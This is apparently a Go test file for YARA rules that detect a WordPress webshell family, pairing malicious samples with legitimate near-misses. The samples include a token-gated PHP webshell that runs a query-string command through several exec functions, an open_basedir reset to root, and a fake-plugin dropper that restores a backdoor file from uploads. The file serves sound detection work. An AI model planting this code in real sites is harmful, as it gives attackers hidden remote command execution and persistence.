//go:build yara

package yara

import "testing"

// Detection tests for the 2026-07-19 blanaroocom self-healing webshell family.
// Before these rules the loaders and mu-plugin droppers went undetected while
// the site was actively backdoored. Positives mirror the real quarantined
// files; negatives are legitimate near-misses.

func TestBackdoorFamily_ExecLadderLoader(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// The fake-plugin loader tries every command backend in turn and reports
	// disable_functions when they are all blocked.
	mal := []byte(`<?php if(!hash_equals('d76e8f99db76f01128730da9f24a470c',$_GET['t'])){return;} $cmd=$_GET['c']; $ok=false;
	if(!$ok&&function_exists('shell_exec')){$r=@shell_exec($cmd);}
	if(!$ok&&function_exists('exec')){@exec($cmd,$a);}
	if(!$ok&&function_exists('passthru')){@passthru($cmd);}
	if(!$ok&&function_exists('system')){@system($cmd);}
	if(!$ok&&function_exists('proc_open')){@proc_open($cmd,$d,$p);}
	if(!$ok&&function_exists('popen')){@popen($cmd,'r');}
	if(!$ok){echo 'disable_functions='.ini_get('disable_functions');}`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_php_exec_ladder") {
		t.Error("webshell_php_exec_ladder: real exec-ladder loader not detected")
	}
	// Legit feature detection: one or two function_exists checks, no ladder.
	legit := []byte(`<?php if (function_exists('exec') && function_exists('shell_exec')) { $out = shell_exec('git rev-parse HEAD'); }`)
	if hasYaraRule(s.ScanBytes(legit), "webshell_php_exec_ladder") {
		t.Error("webshell_php_exec_ladder FP: matched ordinary feature detection")
	}
}

func TestBackdoorFamily_OpenBasedirEscape(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php @chdir('..'); for($i=0;$i<15;$i++){@chdir('..');} @ini_set('open_basedir','/'); file_put_contents($dst,$src);`)
	if !hasYaraRule(s.ScanBytes(mal), "exploit_open_basedir_escape") {
		t.Error("exploit_open_basedir_escape: root open_basedir reset not detected")
	}
	commented := []byte(`<?php ini_set/**/('open_basedir', '/');`)
	if !hasYaraRule(s.ScanBytes(commented), "exploit_open_basedir_escape") {
		t.Error("exploit_open_basedir_escape: comment-separated reset not detected")
	}
	// Legit hardening narrows open_basedir to a real path.
	legit := []byte(`<?php ini_set('open_basedir', ABSPATH . PATH_SEPARATOR . WP_CONTENT_DIR);`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_open_basedir_escape") {
		t.Error("exploit_open_basedir_escape FP: matched legitimate open_basedir narrowing")
	}
	wrapped := []byte(`<?php my_ini_set('open_basedir', '/');`)
	if hasYaraRule(s.ScanBytes(wrapped), "exploit_open_basedir_escape") {
		t.Error("exploit_open_basedir_escape FP: matched ini_set substring in another function")
	}
}

func TestBackdoorFamily_SelfHealDropper(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php /* Plugin Name: WP Core Update Helper */ ` +
		`$_p='/home/u/public_html/wp-content/plugins/media-optimization-core-037131/class-wp-taxonomy-89685b.php';` +
		`$_s='/home/u/public_html/wp-content/uploads/class-wp-cache-81fd80e3.php';` +
		`if(!file_exists($_p)&&file_exists($_s)){@copy($_s,$_p);@chmod($_p,0644);}`)
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_selfheal_dropper") {
		t.Error("backdoor_selfheal_dropper: real uploads->plugins self-heal not detected")
	}
	// Legit media plugin copying an uploaded image within uploads.
	legit := []byte(`<?php $src=$upload_dir.'/image.jpg'; $dst=$upload_dir.'/thumbs/image.jpg'; if(file_exists($src)){copy($src,$dst);}`)
	if hasYaraRule(s.ScanBytes(legit), "backdoor_selfheal_dropper") {
		t.Error("backdoor_selfheal_dropper FP: matched legitimate media copy")
	}
}
